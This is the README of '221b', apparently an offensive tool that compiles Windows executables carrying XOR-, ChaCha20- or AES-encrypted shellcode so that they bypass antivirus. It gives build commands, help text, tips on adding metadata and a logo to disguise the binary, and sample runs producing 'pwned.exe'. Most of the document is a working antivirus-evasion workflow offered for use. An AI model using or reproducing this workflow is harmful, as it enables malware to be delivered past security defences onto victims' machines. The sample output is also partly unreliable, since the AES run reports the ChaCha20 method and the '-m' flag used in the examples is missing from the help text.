# 221b

## Getting started

### 1. Compile binary

```shell
go build -o 221b ./main.go
```

### 2. Copy binary to path

```shell
sudo mv 221b /usr/local/bin/
```

### 3. Exec 221b

```shell
221b bake -k <key> -s <shell>
```

## Usage

```shell
221b help bake
Build a windows payload with the given shell encrypted in it to bypass AV

Usage:
  221b bake [flags]

Flags:
  -h, --help               help for bake
  -k, --key string         key to use for the xor
  -o, --output string      Output path (e.g., /home/bin.exe)
  -s, --shellpath string   Path to the shell scrypt

Global Flags:
      --debug   activate debug mode

```

## Binary properties

It is possible to add a certain number of metadata as well as a logo via the folder named `misc`. 

also remember to modify the `versioninfo.json` file at the root of the project 


here's a preview of the final rendering, so don't ignore this part when planning a red team operation. 

![](/img/preview.png)


## Possible execution methods

### XOR : 

```shell
221b bake -k "@ShLkHms221b" -s /PathToShellcode/demon.bin -o pwned.exe
[+] use xor encryption method
[+] encrypting demon.bin
[+] loading encrypted shell into payload
[+] compiling binary
go: added golang.org/x/crypto v0.11.0
go: added golang.org/x/sys v0.10.0
[+] file compiled to pwned.exe
```

### Chacha20

```shell
221b bake -m chacha20 -k "0123456789ABCDEF1123345611111111" -s /PathToShellcode/demon.bin -o pwned.exe
[+] use chacha20 encryption method
[+] encrypting demon.bin
[+] loading encrypted shell into payload
[+] compiling binary
go: added golang.org/x/crypto v0.11.0
go: added golang.org/x/sys v0.10.0
[+] file compiled to pwned.exe
```


### AES

```shell
221b bake -m aes -k "0123456789ABCDEF1123345611111111" -s /PathToShellcode/demon.bin -o pwned.exe
[+] use chacha20 encryption method
[+] encrypting demon.bin
[+] loading encrypted shell into payload
[+] compiling binary
go: added golang.org/x/crypto v0.11.0
go: added golang.org/x/sys v0.10.0
[+] file compiled to pwned.exe
```



